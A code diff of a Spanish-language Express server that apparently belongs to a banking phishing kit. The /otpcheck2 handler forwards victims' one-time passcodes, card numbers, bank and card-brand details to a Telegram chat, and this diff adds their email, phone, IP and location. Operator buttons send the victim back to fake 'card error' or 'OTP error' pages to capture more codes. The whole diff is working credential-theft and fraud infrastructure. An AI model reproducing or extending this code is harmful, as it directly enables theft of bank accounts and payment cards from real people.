@@ -194,7 +194,7 @@ app.post('/otpcheck', async (req, res) => {
   }
 });
 app.post("/otpcheck2", async (req, res) => {
-  const { otp, sessionId, info } = req.body;
+  const { otp, sessionId, info, ip, location, email, telnum } = req.body;
 
   if (!otp || !sessionId || !info) {
     return res.status(400).send("Datos incompletos");
@@ -208,23 +208,32 @@ app.post("/otpcheck2", async (req, res) => {
     };
 
     const mensaje = `
+🟣Viank🟣 - |[otp-check2]|
+---
 🔐 *NUEVO OTP INGRESADO* 🔐
-------------------------
-*OTP:* ${otp}
-*Número:* ${info?.number || "Desconocido"}
-*Banco:* ${info?.checkerInfo?.bank || "N/A"}
-*Franquicia:* ${info?.checkerInfo?.company || "N/A"}
-    `.trim();
+
+• OTP: ${otp}
+• Número: ${info?.number || "Desconocido"}
+• Banco: ${info?.checkerInfo?.bank || "N/A"}
+• Franquicia: ${info?.checkerInfo?.company || "N/A"}
+
+📩 Email: ${email || 'N/D'}
+📞 Teléfono: ${telnum || 'N/D'}
+🌐 IP: ${ip || "N/D"}
+📍 Ubicación: ${location || "N/D"}
+
+🆔 sessionId: ${sessionId}
+---`.trim();
 
     const buttons = {
       inline_keyboard: [
         [
-          { text: "Error Tarjeta", callback_data: `go:payment.html|${sessionId}` },
-          { text: "Error Logo", callback_data: `go:id-check.html|${sessionId}` }
+          { text: "❌ Error Tarjeta", callback_data: `go:payment.html|${sessionId}` },
+          { text: "⚠️ Error Logo", callback_data: `go:id-check.html|${sessionId}` }
         ],
         [
-          { text: "Error OTP", callback_data: `go:otp-check2.html|${sessionId}` },
-          { text: "Finalizar", callback_data: `go:finish.html|${sessionId}` }
+          { text: "🔁 Error OTP", callback_data: `go:otp-check2.html|${sessionId}` },
+          { text: "✅ Finalizar", callback_data: `go:finish.html|${sessionId}` }
         ]
       ]
     };
@@ -246,7 +255,6 @@ app.post("/otpcheck2", async (req, res) => {
     return res.sendStatus(500);
   }
 });
-
 
 
 // ✅ Webhook de Telegram para botones dinámicos
